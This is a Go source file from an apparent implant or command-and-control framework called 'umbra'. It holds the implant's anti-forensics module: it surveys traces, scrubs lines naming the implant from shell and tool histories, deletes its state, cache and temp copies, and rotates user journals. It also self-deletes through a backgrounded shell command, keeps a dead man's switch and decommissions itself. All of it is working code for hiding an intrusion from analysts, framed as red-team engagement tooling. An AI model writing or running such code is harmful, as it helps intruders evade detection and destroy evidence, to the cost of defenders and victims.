package beacon

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"
)

// The zero-footprint wipe of a POSIX host.
//
// Every implant leaves something behind: a file in the state
// directory, a line in the history of the shell, a line in the journal
// of the system, a prefetch entry, the name of the binary in the table
// of the processes.  Some of it belongs to the implant and some of it
// belongs to the platform, and the difference matters: the artefacts of
// the implant go away with the implant, and the artefacts of the
// platform need the tools of the platform.
//
// The module has four parts:
//
//   - the survey: what is on this host right now, with the size of
//     every file.  It changes nothing;
//   - the wipe: the removal of the artefacts of the families the
//     operator named, with an honest report of what could not be
//     removed and why;
//   - the surface: what an analyst would find on this machine;
//   - the end: the self-destruction of the implant and the
//     decommissioning of the host.
//
// Three rules hold everywhere:
//
//   - a wipe never destroys the material of the user that the implant
//     did not create: the history of the shell is scrubbed of the lines
//     that mention the implant, not deleted;
//   - the operator chooses the family of the artefacts, and the report
//     says which family was touched;
//   - a limit is reported as a limit.  The journal of the kernel, the
//     accounting of the system and the free blocks of the disk are not
//     reachable from a process of a user, and the report says so
//     instead of pretending that the disk is clean.

// The families of the artefacts.
var forensicFamilies = []string{"state", "history", "recent", "cache", "log", "system"}

// forensicStateDir is where the implant keeps its own state.
func forensicStateDir() string {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		home = "."
	}
	return filepath.Join(home, ".umbra")
}

// forensicJournal is the journal of the engagement.
func forensicJournal() string {
	return filepath.Join(forensicStateDir(), "journal.state")
}

// forensicJournalFlag says whether the journal is on.
func forensicJournalFlag() string {
	return filepath.Join(forensicStateDir(), "journal.on")
}

// artefact is one thing that carries a trace of the engagement.
type artefact struct {
	id     string
	label  string
	kind   string // file | directory | glob | scrub | command | limit | self
	family string // state | history | recent | cache | log | system
	path   string
	note   string
}

// finding is one artefact, as it is on the machine right now.
type finding struct {
	artefact
	present bool
	size    int64
	detail  string
}

// forensicCatalogue is the knowledge of the platform.
//
// The list is built for the platform the implant runs on, so the report
// of a machine reads like the machine.
func forensicCatalogue() []artefact {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		home = "$HOME"
	}
	out := []artefact{
		{
			id:     "implant.state",
			label:  "the state of the implant",
			kind:   "directory",
			family: "state",
			path:   forensicStateDir(),
			note:   "the persistence entries, the queue of the watchers and the journal",
		},
		{
			id:     "implant.journal",
			label:  "the journal of the engagement",
			kind:   "file",
			family: "state",
			path:   forensicJournal(),
			note:   "the record of what the implant did on this host",
		},
		{
			id:     "implant.binary",
			label:  "the binary of the implant",
			kind:   "self",
			family: "state",
			path:   "",
			note:   "the file of a running process cannot be removed while it runs",
		},
		{
			id:     "implant.temp",
			label:  "the copies of the implant in the temporary directory",
			kind:   "glob",
			family: "cache",
			path:   filepath.Join(os.TempDir(), "umbra*"),
			note:   "the copies the implant makes while it works",
		},
	}

	// The history of the shells is scrubbed, never deleted: the lines
	// that mention the implant go, the rest stays.
	for _, item := range []struct{ id, label, path string }{
		{"history.bash", "the history of bash", ".bash_history"},
		{"history.zsh", "the history of zsh", ".zsh_history"},
		{"history.sh", "the history of sh", ".sh_history"},
		{"history.python", "the history of python", ".python_history"},
		{"history.psql", "the history of psql", ".psql_history"},
		{"history.mysql", "the history of mysql", ".mysql_history"},
		{"history.less", "the history of less", ".lesshst"},
		{"history.vim", "the history of vim", ".viminfo"},
		{"history.node", "the history of node", ".node_repl_history"},
		{"history.wget", "the hosts of wget", ".wget-hsts"},
	} {
		out = append(out, artefact{
			id:     item.id,
			label:  item.label,
			kind:   "scrub",
			family: "history",
			path:   filepath.Join(home, item.path),
			note:   "the lines that mention the implant are taken out; the rest stays",
		})
	}
	out = append(out,
		artefact{
			id:     "history.bash_sessions",
			label:  "the sessions of bash",
			kind:   "directory",
			family: "history",
			path:   filepath.Join(home, ".bash_sessions"),
			note:   "the commands of the sessions that are still open",
		},
		artefact{
			id:     "recent.xbel",
			label:  "the recent files of the desktop",
			kind:   "scrub",
			family: "recent",
			path:   filepath.Join(home, ".local/share/recently-used.xbel"),
			note:   "the list of the files the user opened",
		},
		artefact{
			id:     "recent.applications",
			label:  "the recent applications",
			kind:   "scrub",
			family: "recent",
			path:   filepath.Join(home, ".local/share/recently-applications.desktop"),
			note:   "the list of the programs the user ran",
		},
		artefact{
			id:     "recent.trash",
			label:  "the trash of the user",
			kind:   "directory",
			family: "recent",
			path:   filepath.Join(home, ".local/share/Trash"),
			note:   "the files the user threw away; the implant may be in it",
		},
		artefact{
			id:     "cache.umbra",
			label:  "the cache of the implant",
			kind:   "glob",
			family: "cache",
			path:   filepath.Join(home, ".cache", "umbra*"),
			note:   "the cache the implant keeps between the sessions",
		},
		artefact{
			id:     "log.unified",
			label:  "the journal of the system",
			kind:   "command",
			family: "log",
			path:   "journalctl --user --rotate",
			note:   "the journal of the user is rotated, not deleted",
		},
		artefact{
			id:     "log.audit",
			label:  "the log of the audit",
			kind:   "command",
			family: "log",
			path:   "journalctl --user --rotate --audit",
			note:   "the audit log of the user is rotated, not deleted",
		},
		artefact{
			id:     "log.history",
			label:  "the log of the commands of the user",
			kind:   "command",
			family: "log",
			path:   "journalctl _UID=$(id -u) --rotate",
			note:   "the journal of the user is rotated, not deleted",
		},
		artefact{
			id:     "limit.utmp",
			label:  "the record of the logins",
			kind:   "limit",
			family: "system",
			path:   "/var/run/utmp",
			note:   "the record of the logins is written by the system and is not the property of a user",
		},
		artefact{
			id:     "limit.lastlog",
			label:  "the record of the last login of every user",
			kind:   "limit",
			family: "system",
			path:   "/var/log/lastlog",
			note:   "the record of the logins is written by the system and is not the property of a user",
		},
		artefact{
			id:     "limit.wtmp",
			label:  "the record of the logins and of the logouts",
			kind:   "limit",
			family: "system",
			path:   "/var/log/wtmp",
			note:   "the record of the logins is written by the system and is not the property of a user",
		},
		artefact{
			id:     "limit.btmp",
			label:  "the record of the failed logins",
			kind:   "limit",
			family: "system",
			path:   "/var/log/btmp",
			note:   "the record of the failed logins is written by the system and is not the property of a user",
		},
		artefact{
			id:     "limit.free",
			label:  "the free blocks of the disk",
			kind:   "limit",
			family: "system",
			path:   "the free space of the file system",
			note:   "the content of a deleted file stays on the disk until the space is used again",
		},
		artefact{
			id:     "limit.swap",
			label:  "the swap of the machine",
			kind:   "limit",
			family: "system",
			path:   "the swap of the system",
			note:   "the memory of the process may be in the swap of the machine",
		},
	)
	return out
}

// forensicSurvey looks at every artefact of the catalogue.
//
// The survey changes nothing: it looks, it measures, it reports.
func forensicSurvey() []finding {
	markers := forensicMarkers()
	out := make([]finding, 0, len(forensicCatalogue()))
	for _, item := range forensicCatalogue() {
		out = append(out, forensicLook(item, markers))
	}
	return out
}

// forensicLook looks at one artefact.
func forensicLook(item artefact, markers []string) finding {
	note := item.note
	present := false
	var size int64
	switch item.kind {
	case "limit":
		present = true
	case "command":
		present = true
		note = note + " (run it to clear it)"
	case "self":
		present = true
		note = note + " (the deletion is scheduled by wipe.self)"
	case "glob":
		matches := forensicGlob(item.path)
		present = len(matches) > 0
		for _, match := range matches {
			size += forensicFileSize(match)
		}
		if present {
			note = fmt.Sprintf("%s (%d files)", note, len(matches))
		}
	default:
		info, err := os.Stat(item.path)
		if err == nil {
			present = true
			if info.IsDir() {
				size = forensicDirSize(item.path)
			} else {
				size = info.Size()
			}
		}
	}
	// A file that mentions the implant is a trace even when the path of
	// the artefact does not say so.
	if item.kind == "scrub" && present {
		if data, err := os.ReadFile(item.path); err == nil {
			for _, line := range strings.Split(string(data), "\n") {
				if forensicMentions(line, markers) {
					note = note + " (the file names the implant)"
					break
				}
			}
		}
	}
	return finding{artefact: item, present: present, size: size, detail: note}
}

// forensicSurveyReport is the report of the survey.
func forensicSurveyReport(findings []finding) string {
	var out strings.Builder
	present := make([]finding, 0, len(findings))
	var total int64
	for _, item := range findings {
		if item.present {
			present = append(present, item)
			total += item.size
		}
	}
	fmt.Fprintf(&out, "wipe.survey: %d artefacts are on this host, %d bytes\n", len(present), total)
	for _, item := range present {
		fmt.Fprintf(&out, "  %-22s %-10s %10d  %s\n", item.id, item.kind, item.size, item.path)
	}
	limits := 0
	for _, item := range present {
		if item.kind == "limit" {
			limits++
		}
	}
	if limits > 0 {
		fmt.Fprintf(&out, "wipe.survey: %d of them are out of the reach of a process of a user\n", limits)
		for _, item := range present {
			if item.kind == "limit" {
				fmt.Fprintf(&out, "  %-22s %s\n", item.id, item.detail)
			}
		}
	}
	return out.String()
}

// forensicMarkers are the words that name the implant in a file of the
// user.
func forensicMarkers() []string {
	out := []string{"umbra"}
	if exe, err := os.Executable(); err == nil {
		out = append(out, filepath.Base(exe))
	}
	kept := out[:0]
	for _, marker := range out {
		if marker != "" {
			kept = append(kept, marker)
		}
	}
	return kept
}

// forensicMentions says whether a line names the implant.
func forensicMentions(line string, markers []string) bool {
	lower := strings.ToLower(line)
	for _, marker := range markers {
		marker = strings.ToLower(marker)
		if marker != "" && strings.Contains(lower, marker) {
			return true
		}
	}
	return false
}

// forensicSelected are the families the operator asked for.
func forensicSelected(args map[string]any) []string {
	asked := []string{}
	for _, item := range arrField(args, "what") {
		if text, ok := item.(string); ok {
			asked = append(asked, text)
		}
	}
	if len(asked) == 0 {
		return []string{"state", "history", "recent", "cache", "log"}
	}
	out := []string{}
	for _, item := range asked {
		if item == "all" {
			for _, family := range forensicFamilies {
				if !forensicHas(out, family) {
					out = append(out, family)
				}
			}
			continue
		}
		if forensicHas(forensicFamilies, item) && !forensicHas(out, item) {
			out = append(out, item)
		}
	}
	if len(out) == 0 {
		out = append(out, "state")
	}
	return out
}

// forensicHas says whether a list holds an item.
func forensicHas(list []string, item string) bool {
	for _, value := range list {
		if value == item {
			return true
		}
	}
	return false
}

// attested adds the attestation of the report to the outcome.
//
// The report is signed with the key of the agent, so the operator keeps
// a proof of what the implant removed even when the host is gone.  The
// label is the domain separation of the framework: a signature over a
// report is not a signature over a frame.
func (b *Beacon) attested(out Outcome) Outcome {
	if out.Extra == nil {
		out.Extra = map[string]any{}
	}
	mac := hmac.New(sha256.New, b.cfg.PSK)
	mac.Write([]byte("umbra/w1/attest"))
	mac.Write(out.Out)
	out.Extra["attest"] = hex.EncodeToString(mac.Sum(nil))
	return out
}

// taskWipeDeadman arms the dead man's switch.
func (b *Beacon) taskWipeDeadman(args map[string]any) Outcome {
	text, meta, err := forensicDeadmanArm(args)
	if err != nil {
		return Outcome{Code: 1, Err: err.Error()}
	}
	return b.attested(Outcome{Code: 0, Out: []byte(text), Extra: meta})
}

// taskWipeSurvey is the survey of the artefacts of the engagement.
func (b *Beacon) taskWipeSurvey(args map[string]any) Outcome {
	findings := forensicSurvey()
	present := 0
	var total int64
	for _, item := range findings {
		if item.present {
			present++
			total += item.size
		}
	}
	return Outcome{
		Code: 0,
		Out:  []byte(forensicSurveyReport(findings)),
		Extra: map[string]any{
			"wipe_artifacts": int64(present),
			"wipe_bytes":     total,
		},
	}
}

// taskWipeRun removes the artefacts of the engagement.
//
// The families are the ones the operator named, and the report says
// which family was touched: a wipe that removes everything and a wipe
// that removes the history are not the same thing.
func (b *Beacon) taskWipeRun(args map[string]any) Outcome {
	wanted := forensicSelected(args)
	dry := boolOr(args, "dry_run", false)
	markers := forensicMarkers()
	var out strings.Builder
	var removed, failed int
	var bytes int64
	lines := []string{}

	for _, item := range forensicSurvey() {
		if !forensicHas(wanted, item.family) {
			continue
		}
		if !item.present || item.kind == "limit" {
			continue
		}
		switch item.kind {
		case "command":
			if dry {
				lines = append(lines, fmt.Sprintf("  %s: would run %s", item.id, item.path))
				continue
			}
			code := forensicRun(item.path)
			if code != 0 {
				failed++
				lines = append(lines, fmt.Sprintf("  %s: ran %s (exit %d)", item.id, item.path, code))
				continue
			}
			lines = append(lines, fmt.Sprintf("  %s: ran %s", item.id, item.path))
		case "scrub":
			data, err := os.ReadFile(item.path)
			if err != nil {
				lines = append(lines, fmt.Sprintf("  %s: could not be read: %v", item.id, err))
				continue
			}
			kept := []string{}
			dropped := 0
			for _, line := range strings.Split(string(data), "\n") {
				if forensicMentions(line, markers) {
					dropped++
					continue
				}
				kept = append(kept, line)
			}
			if dropped == 0 {
				lines = append(lines, fmt.Sprintf("  %s: nothing to scrub", item.id))
				continue
			}
			if dry {
				lines = append(lines, fmt.Sprintf("  %s: would scrub %d lines of %s", item.id, dropped, item.path))
				continue
			}
			if err := os.WriteFile(item.path, []byte(strings.Join(kept, "\n")), 0o600); err != nil {
				failed++
				lines = append(lines, fmt.Sprintf("  %s: could not be scrubbed: %v", item.id, err))
				continue
			}
			removed++
			lines = append(lines, fmt.Sprintf("  %s: scrubbed %s", item.id, item.path))
		case "glob":
			for _, match := range forensicGlob(item.path) {
				size := forensicFileSize(match)
				if dry {
					removed++
					bytes += size
					lines = append(lines, fmt.Sprintf("  %s: would remove %s", item.id, match))
					continue
				}
				if err := forensicRemove(match); err != nil {
					failed++
					lines = append(lines, fmt.Sprintf("  %s: could not remove %s: %v", item.id, match, err))
					continue
				}
				removed++
				bytes += size
				lines = append(lines, fmt.Sprintf("  %s: removed %s", item.id, match))
			}
		case "self":
			lines = append(lines, fmt.Sprintf("  %s: the binary of a running process is removed by wipe.self", item.id))
		case "directory":
			size := forensicDirSize(item.path)
			if dry {
				removed++
				bytes += size
				lines = append(lines, fmt.Sprintf("  %s: would remove %s", item.id, item.path))
				continue
			}
			if err := forensicRemove(item.path); err != nil {
				failed++
				lines = append(lines, fmt.Sprintf("  %s: could not remove %s: %v", item.id, item.path, err))
				continue
			}
			removed++
			bytes += size
			lines = append(lines, fmt.Sprintf("  %s: removed %s", item.id, item.path))
		default:
			size := forensicFileSize(item.path)
			if dry {
				removed++
				bytes += size
				lines = append(lines, fmt.Sprintf("  %s: would remove %s", item.id, item.path))
				continue
			}
			if err := os.Remove(item.path); err != nil {
				failed++
				lines = append(lines, fmt.Sprintf("  %s: could not remove %s: %v", item.id, item.path, err))
				continue
			}
			removed++
			bytes += size
			lines = append(lines, fmt.Sprintf("  %s: removed %s", item.id, item.path))
		}
	}

	fmt.Fprintf(&out, "wipe.run: %d artefacts removed, %d bytes, %d failures", removed, bytes, failed)
	if dry {
		out.WriteString(" (dry run)")
	}
	out.WriteString("\n")
	for _, line := range lines {
		out.WriteString(line)
		out.WriteString("\n")
	}
	left := 0
	for _, item := range forensicSurvey() {
		if item.present && item.kind != "limit" {
			left++
		}
	}
	fmt.Fprintf(&out, "wipe.run: %d artefacts of the engagement are still on this host\n", left)
	return Outcome{
		Code: 0,
		Out:  []byte(out.String()),
		Extra: map[string]any{
			"wipe_removed": int64(removed),
			"wipe_bytes":   bytes,
			"wipe_failed":  int64(failed),
			"wipe_left":    int64(left),
			"wipe_dry_run": dry,
		},
	}
}

// taskWipeVerify looks at the machine after the wipe and says what is
// left.
func (b *Beacon) taskWipeVerify(args map[string]any) Outcome {
	findings := forensicSurvey()
	var out strings.Builder
	left, limits := 0, 0
	removable := []finding{}
	for _, item := range findings {
		if !item.present {
			continue
		}
		left++
		if item.kind == "limit" {
			limits++
			continue
		}
		removable = append(removable, item)
	}
	fmt.Fprintf(&out, "wipe.verify: %d artefacts are still on this host, %d of them are out of reach\n", left, limits)
	for _, item := range removable {
		fmt.Fprintf(&out, "  %-22s %-10s %s\n", item.id, item.kind, item.path)
	}
	for _, item := range findings {
		if item.present && item.kind == "limit" {
			fmt.Fprintf(&out, "  %-22s %s\n", item.id, item.detail)
		}
	}
	if len(removable) == 0 {
		out.WriteString("wipe.verify: the host carries nothing that the implant can remove\n")
	}
	return Outcome{
		Code: 0,
		Out:  []byte(out.String()),
		Extra: map[string]any{
			"wipe_left":   int64(len(removable)),
			"wipe_limits": int64(limits),
		},
	}
}

// taskForensicsReport is what an analyst would find on this machine.
func (b *Beacon) taskForensicsReport(args map[string]any) Outcome {
	findings := forensicSurvey()
	var out strings.Builder
	out.WriteString(forensicSurveyReport(findings))
	out.WriteString("forensics.report: the process of the implant\n")
	pid := os.Getpid()
	exe, _ := os.Executable()
	fmt.Fprintf(&out, "  pid %d | %s\n", pid, exe)
	items := forensicJournalItems()
	size := forensicFileSize(forensicJournal())
	fmt.Fprintf(&out, "forensics.report: the journal holds %d entries (%d bytes)\n", len(items), size)
	present := 0
	var bytes int64
	for _, item := range findings {
		if item.present {
			present++
			bytes += item.size
		}
	}
	return Outcome{
		Code: 0,
		Out:  []byte(out.String()),
		Extra: map[string]any{
			"forensics_artifacts": int64(present),
			"forensics_bytes":     bytes,
			"forensics_journal":   int64(len(items)),
			"forensics_pid":       int64(pid),
		},
	}
}

// taskForensicsTimeline is the timeline of the engagement on this host.
func (b *Beacon) taskForensicsTimeline(args map[string]any) Outcome {
	var out strings.Builder
	switch strOr(args, "journal", "") {
	case "on":
		out.WriteString("forensics.timeline: " + forensicJournalSet(true) + "\n")
	case "off":
		out.WriteString("forensics.timeline: " + forensicJournalSet(false) + "\n")
	}
	items := forensicJournalItems()
	fmt.Fprintf(&out, "forensics.timeline: %d entries in the journal of the engagement\n", len(items))
	state := "off"
	if forensicJournalEnabled() {
		state = "on"
	}
	fmt.Fprintf(&out, "forensics.timeline: the journal is %s\n", state)
	for _, item := range items {
		fmt.Fprintf(&out, "  %s  %-22s %s\n", forensicFormatTime(item.at), item.event, item.detail)
	}
	if len(items) == 0 {
		out.WriteString("forensics.timeline: the journal is empty: the implant wrote nothing\n")
	}
	return Outcome{
		Code: 0,
		Out:  []byte(out.String()),
		Extra: map[string]any{
			"forensics_entries": int64(len(items)),
		},
	}
}

// taskWipeSelf is the self-destruction of the implant.
//
// The file of a running process cannot be removed while it runs, so the
// deletion is done by a child that waits for the parent to end.  The
// state and the journal go with it.
func (b *Beacon) taskWipeSelf(args map[string]any) Outcome {
	var out strings.Builder
	var removed int
	var bytes int64
	if !boolOr(args, "keep_state", false) {
		state := forensicStateDir()
		size := forensicDirSize(state)
		if err := forensicRemove(state); err != nil {
			fmt.Fprintf(&out, "wipe.self: the state could not be removed: %v\n", err)
		} else {
			removed++
			bytes += size
			fmt.Fprintf(&out, "wipe.self: the state of the implant was removed (%d bytes)\n", size)
		}
	}
	if exe, err := os.Executable(); err == nil {
		if note, err := forensicScheduleDeletion(exe); err == nil {
			removed++
			fmt.Fprintf(&out, "wipe.self: %s\n", note)
		} else {
			fmt.Fprintf(&out, "wipe.self: the binary could not be removed: %v\n", err)
		}
		fmt.Fprintf(&out, "wipe.self: the binary is %s\n", exe)
	} else {
		fmt.Fprintf(&out, "wipe.self: the binary is unknown: %v\n", err)
	}
	out.WriteString("wipe.self: the implant leaves the machine\n")
	// The implant ends with the answer: the operator reads what was
	// removed and what was not, and then the process goes away.
	b.stop = true
	return Outcome{
		Code: 0,
		Out:  []byte(out.String()),
		Extra: map[string]any{
			"wipe_removed": int64(removed),
			"wipe_bytes":   bytes,
		},
	}
}

// taskDecommission is the end of the engagement, in one task.
//
// The order matters: the watchers first (they would write into the
// state that is about to go), then the traces, then the binary, and the
// report of the verification at the end.
func (b *Beacon) taskDecommission(args map[string]any) Outcome {
	var out strings.Builder
	// The watchers of this implant.
	clipboardMutex.Lock()
	clipboardRunning = false
	clipboardMutex.Unlock()
	out.WriteString("decommission: the watchers were stopped\n")
	// The traces.
	wiped := b.taskWipeRun(map[string]any{})
	out.Write(wiped.Out)
	// The binary.
	ended := b.taskWipeSelf(args)
	out.Write(ended.Out)
	// The verification.
	verified := b.taskWipeVerify(map[string]any{})
	out.Write(verified.Out)
	extra := map[string]any{}
	for key, value := range wiped.Extra {
		extra[key] = value
	}
	for key, value := range ended.Extra {
		extra[key] = value
	}
	for key, value := range verified.Extra {
		extra[key] = value
	}
	return Outcome{Code: 0, Out: []byte(out.String()), Extra: extra}
}

// ---------------------------------------------------------------------------
// The dead man's switch
// ---------------------------------------------------------------------------

// forensicDeadman is the file of the dead man's switch.
//
// The switch lives in the state directory, so it survives a reboot: a
// switch that a reboot disarms is not a switch.
func forensicDeadman() string {
	return filepath.Join(forensicStateDir(), "deadman.state")
}

// forensicDeadmanState is the state of the switch.
type forensicDeadmanState struct {
	deadline int64
	minutes  uint64
}

// forensicDeadmanState reads the state of the switch.
func forensicDeadmanState() (forensicDeadmanState, bool) {
	data, err := os.ReadFile(forensicDeadman())
	if err != nil {
		return forensicDeadmanState{}, false
	}
	parts := strings.SplitN(strings.TrimSpace(string(data)), "|", 2)
	if len(parts) != 2 {
		return forensicDeadmanState{}, false
	}
	minutes, err := strconv.ParseUint(parts[1], 10, 64)
	if err != nil {
		return forensicDeadmanState{}, false
	}
	return forensicDeadmanState{deadline: parseInt64(parts[0]), minutes: minutes}, true
}

// forensicDeadmanArm arms the dead man's switch.
//
// The implant ends itself when the operator stops checking in: an
// implant that outlives its engagement is an implant nobody is
// watching.  Every check-in of the operator renews the window, so the
// switch fires only when the team goes quiet.
func forensicDeadmanArm(args map[string]any) (string, map[string]any, error) {
	minutes := u64Or(args, "minutes", 0)
	path := forensicDeadman()
	if minutes == 0 {
		if err := os.Remove(path); err != nil {
			if os.IsNotExist(err) {
				return "wipe.deadman: the dead man's switch was already disarmed\n",
					map[string]any{"wipe_deadman": int64(0)}, nil
			}
			return "", nil, err
		}
		return "wipe.deadman: the dead man's switch is disarmed\n",
			map[string]any{"wipe_deadman": int64(0)}, nil
	}
	deadline := time.Now().UnixMilli() + int64(minutes)*60_000
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		return "", nil, err
	}
	body := fmt.Sprintf("%d|%d", deadline, minutes)
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		return "", nil, err
	}
	return fmt.Sprintf("wipe.deadman: the implant ends itself if the operator does not check in for %d minutes\n", minutes),
		map[string]any{
			"wipe_deadman":         int64(minutes),
			"wipe_deadman_deadline": deadline / 1000,
		}, nil
}

// forensicDeadmanRenew renews the window of the switch.
//
// Every check-in of the operator is a proof that the engagement is
// alive, so the deadline moves with it.
func forensicDeadmanRenew() {
	state, ok := forensicDeadmanState()
	if !ok {
		return
	}
	deadline := time.Now().UnixMilli() + int64(state.minutes)*60_000
	body := fmt.Sprintf("%d|%d", deadline, state.minutes)
	_ = os.WriteFile(forensicDeadman(), []byte(body), 0o600)
}

// forensicDeadmanFired says whether the switch has fired.
func forensicDeadmanFired() bool {
	state, ok := forensicDeadmanState()
	if !ok {
		return false
	}
	return time.Now().UnixMilli() >= state.deadline
}

// ---------------------------------------------------------------------------
// The helpers
// ---------------------------------------------------------------------------

// forensicRun runs the command of an artefact and returns its exit code.
func forensicRun(command string) int {
	cmd := exec.Command("/bin/sh", "-c", command)
	cmd.Stdout = nil
	cmd.Stderr = nil
	if err := cmd.Run(); err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			return exitErr.ExitCode()
		}
		return 1
	}
	return 0
}

// forensicRemove removes a file or a directory and everything under it.
func forensicRemove(path string) error {
	info, err := os.Lstat(path)
	if err != nil {
		return err
	}
	if info.IsDir() {
		return os.RemoveAll(path)
	}
	return os.Remove(path)
}

// forensicFileSize is the size of a file.
func forensicFileSize(path string) int64 {
	info, err := os.Stat(path)
	if err != nil {
		return 0
	}
	return info.Size()
}

// forensicDirSize is the size of a directory.
func forensicDirSize(path string) int64 {
	var total int64
	entries, err := os.ReadDir(path)
	if err != nil {
		return 0
	}
	for _, entry := range entries {
		full := filepath.Join(path, entry.Name())
		if entry.IsDir() {
			total += forensicDirSize(full)
			continue
		}
		total += forensicFileSize(full)
	}
	return total
}

// forensicGlob is the files that match a pattern.
//
// The pattern is a path with a star in the last part: the shell of the
// implant is not a shell, and it does not need to be.  The star is the
// only wildcard.
func forensicGlob(pattern string) []string {
	out := []string{}
	parent := filepath.Dir(pattern)
	name := filepath.Base(pattern)
	if !strings.Contains(name, "*") {
		if _, err := os.Stat(pattern); err == nil {
			return []string{pattern}
		}
		return out
	}
	entries, err := os.ReadDir(parent)
	if err != nil {
		return out
	}
	for _, entry := range entries {
		if forensicWildcard(entry.Name(), name) {
			out = append(out, filepath.Join(parent, entry.Name()))
		}
	}
	sort.Strings(out)
	return out
}

// forensicWildcard says whether a name matches a pattern.
//
// The star is the only wildcard: it matches any run of characters, and
// the rest of the pattern has to be there.
func forensicWildcard(text, pattern string) bool {
	parts := strings.Split(pattern, "*")
	if len(parts) == 1 {
		return text == pattern
	}
	first, last := parts[0], parts[len(parts)-1]
	if !strings.HasPrefix(text, first) || !strings.HasSuffix(text, last) {
		return false
	}
	if len(first)+len(last) > len(text) {
		return false
	}
	rest := text[len(first) : len(text)-len(last)]
	for _, part := range parts[1 : len(parts)-1] {
		index := strings.Index(rest, part)
		if index < 0 {
			return false
		}
		rest = rest[index+len(part):]
	}
	return true
}

// forensicJournalEnabled says whether the journal is on.
//
// The journal is a trace like any other, so it is off until the
// operator asks for it.
func forensicJournalEnabled() bool {
	_, err := os.Stat(forensicJournalFlag())
	return err == nil
}

// forensicJournalSet turns the journal on or off.
func forensicJournalSet(enabled bool) string {
	flag := forensicJournalFlag()
	if enabled {
		if err := os.MkdirAll(filepath.Dir(flag), 0o700); err != nil {
			return "the journal did not change: " + err.Error()
		}
		if err := os.WriteFile(flag, []byte("on"), 0o600); err != nil {
			return "the journal did not change: " + err.Error()
		}
		return "the journal of the engagement is on"
	}
	if err := os.Remove(flag); err != nil {
		if os.IsNotExist(err) {
			return "the journal of the engagement was already off"
		}
		return "the journal did not change: " + err.Error()
	}
	return "the journal of the engagement is off"
}

// forensicJournalAppend writes one line into the journal of the
// engagement.
func forensicJournalAppend(event, detail string) {
	path := forensicJournal()
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		return
	}
	line := fmt.Sprintf("%d|%s|%s\n", time.Now().UnixMilli(),
		strings.ReplaceAll(event, "|", "/"),
		strings.ReplaceAll(strings.ReplaceAll(detail, "|", "/"), "\n", " "))
	file, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600)
	if err != nil {
		return
	}
	defer file.Close()
	file.WriteString(line)
}

// forensicJournalEntry is one line of the journal.
type forensicJournalEntry struct {
	at     int64
	event  string
	detail string
}

// forensicJournalItems are the entries of the journal.
func forensicJournalItems() []forensicJournalEntry {
	out := []forensicJournalEntry{}
	data, err := os.ReadFile(forensicJournal())
	if err != nil {
		return out
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.TrimSpace(line) == "" {
			continue
		}
		parts := strings.SplitN(line, "|", 3)
		entry := forensicJournalEntry{event: "", detail: ""}
		if len(parts) > 0 {
			entry.at = parseInt64(parts[0])
		}
		if len(parts) > 1 {
			entry.event = parts[1]
		}
		if len(parts) > 2 {
			entry.detail = parts[2]
		}
		out = append(out, entry)
	}
	return out
}

// forensicScheduleDeletion removes the binary after the implant ends.
//
// The file of a running process cannot be removed while it runs, so a
// child waits for the parent and removes it a moment later.
func forensicScheduleDeletion(path string) (string, error) {
	command := fmt.Sprintf("(sleep 2; rm -f '%s') >/dev/null 2>&1 &",
		strings.ReplaceAll(path, "'", "'\\''"))
	cmd := exec.Command("/bin/sh", "-c", command)
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil
	if err := cmd.Start(); err != nil {
		return "", err
	}
	return "the binary is removed a moment after the implant ends", nil
}

// forensicFormatTime is the time of the journal, in the format of the
// reports.
func forensicFormatTime(millis int64) string {
	return time.UnixMilli(millis).UTC().Format("2006-01-02T15:04:05Z")
}

// parseInt64 reads an integer, and gives zero when the text is not one.
func parseInt64(text string) int64 {
	var out int64
	negative := false
	text = strings.TrimSpace(text)
	if text == "" {
		return 0
	}
	if text[0] == '-' {
		negative = true
		text = text[1:]
	}
	for _, r := range text {
		if r < '0' || r > '9' {
			return 0
		}
		out = out*10 + int64(r-'0')
	}
	if negative {
		return -out
	}
	return out
}
